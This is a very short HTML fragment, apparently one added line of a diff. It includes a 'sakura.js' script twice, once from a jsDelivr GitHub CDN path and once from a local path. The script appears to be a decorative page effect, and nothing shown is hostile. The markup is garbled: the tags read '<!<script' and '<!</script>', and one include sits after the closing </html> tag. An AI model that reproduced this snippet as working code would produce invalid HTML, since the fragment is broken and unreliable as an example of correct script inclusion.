+<!<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yremp/yremp-js@1.5/sakura.js"><!</script></body></html><!<script type="text/javascript" src="\js\sakura.js"><!</script>
